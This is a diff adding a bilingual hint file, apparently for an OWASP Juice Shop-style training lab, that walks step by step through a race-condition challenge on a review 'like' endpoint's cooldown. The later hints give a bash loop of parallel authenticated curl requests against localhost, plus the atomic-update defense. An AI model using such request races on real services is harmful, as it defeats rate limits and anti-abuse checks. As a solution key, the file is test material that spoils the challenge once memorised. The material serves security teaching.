@@ -1,0 +1,100 @@
+challenge_key: "timingAttackChallenge"
+schema_version: "juicelab.hints.v2"
+
+hints:
+  N1:
+    cost_pct: 5
+    text_fr: |
+      Hint OWASP : "spam likes faster than cooldown". Le like a un
+      cooldown anti-spam mais la verification a une race condition.
+    text_en: |
+      OWASP hint: "spam likes faster than cooldown". Like has anti-spam
+      cooldown but verification has race condition.
+    pedagogical_intent: |
+      Activate TOCTOU + race reflex.
+
+  N2:
+    cost_pct: 10
+    text_fr: |
+      L'endpoint POST /api/Reviews/{id}/like a un cooldown 5s. Mais la
+      verification est non-atomique : check timestamp + update separes.
+      Lancer plusieurs reqs en parallele avant que le 1er ait write
+      timestamp = race.
+    text_en: |
+      POST /api/Reviews/{id}/like endpoint has 5s cooldown. But
+      verification is non-atomic: check timestamp + update separated.
+      Launching multiple parallel reqs before 1st writes timestamp =
+      race.
+    pedagogical_intent: |
+      Spell race mechanism.
+
+  N3:
+    cost_pct: 20
+    text_fr: |
+      Login + identifier un review (DevTools Network sur /#/product).
+      Recuperer review_id. Lancer 10 POST en parallele :
+      `for i in {1..10}; do curl -X POST /api/Reviews/$ID/like &; done;
+      wait`. Le count > 2 trigger solve.
+    text_en: |
+      Login + identify a review (DevTools Network on /#/product). Get
+      review_id. Launch 10 parallel POSTs:
+      `for i in {1..10}; do curl -X POST /api/Reviews/$ID/like &; done;
+      wait`. count > 2 triggers solve.
+    pedagogical_intent: |
+      Reveal command pattern.
+
+  N4:
+    cost_pct: 35
+    text_fr: |
+      Bash :
+      `TOKEN="..."; ID="<review_id>"; for i in {1..10}; do curl -X POST
+      -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json"
+      -d "{}" "http://localhost:3000/api/Reviews/$ID/like" & done; wait`.
+      Le serveur likeProductReviews.ts:48
+      `solveIf(timingAttackChallenge, () => count > 2)` declenche si plus
+      de 2 likes passent avant le cooldown.
+    text_en: |
+      Bash:
+      `TOKEN="..."; ID="<review_id>"; for i in {1..10}; do curl -X POST
+      -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json"
+      -d "{}" "http://localhost:3000/api/Reviews/$ID/like" & done; wait`.
+      Server likeProductReviews.ts:48
+      `solveIf(timingAttackChallenge, () => count > 2)` triggers if more
+      than 2 likes pass before cooldown.
+    pedagogical_intent: |
+      Spell exact command.
+
+  N5:
+    cost_pct: 50
+    text_fr: |
+      [KILL_CHAIN_DOCUMENTED] Workflow : (1) Login (Bearer token via
+      DevTools Network). (2) Naviguer /#/search > pick product > inspect
+      Network when expanding reviews -> trouve `GET /rest/products/{id}/
+      reviews`, recupere review IDs. (3) Bash :
+      `for i in {1..10}; do curl -X POST -H "Authorization: Bearer $T"
+      -H "Content-Type: application/json" -d "{}" "http://localhost:3000/
+      api/Reviews/<review_id>/like" & done; wait`. (4) Le serveur lit
+      lastLikeTimestamp pour les 10 reqs en parallele AVANT que la 1ere
+      write -> toutes passent le check 5s. (5) likeProductReviews.ts:48
+      detect count > 2 -> solve. Defense : UPDATE atomic
+      `UPDATE reviews SET likes_count = likes_count + 1, last_like_at =
+      NOW() WHERE id = ? AND last_like_at < NOW() - INTERVAL 5s`,
+      idempotency key, distributed lock. Source : likeProductReviews.
+      ts:48.
+    text_en: |
+      [KILL_CHAIN_DOCUMENTED] Workflow: (1) Login (Bearer token via
+      DevTools Network). (2) Navigate /#/search > pick product > inspect
+      Network when expanding reviews -> find `GET /rest/products/{id}/
+      reviews`, get review IDs. (3) Bash:
+      `for i in {1..10}; do curl -X POST -H "Authorization: Bearer $T"
+      -H "Content-Type: application/json" -d "{}" "http://localhost:3000/
+      api/Reviews/<review_id>/like" & done; wait`. (4) Server reads
+      lastLikeTimestamp for 10 parallel reqs BEFORE 1st writes -> all
+      pass 5s check. (5) likeProductReviews.ts:48 detects count > 2 ->
+      solve. Defense: atomic UPDATE
+      `UPDATE reviews SET likes_count = likes_count + 1, last_like_at =
+      NOW() WHERE id = ? AND last_like_at < NOW() - INTERVAL 5s`,
+      idempotency key, distributed lock. Source: likeProductReviews.
+      ts:48.
+    pedagogical_intent: |
+      Solution + atomic defense.
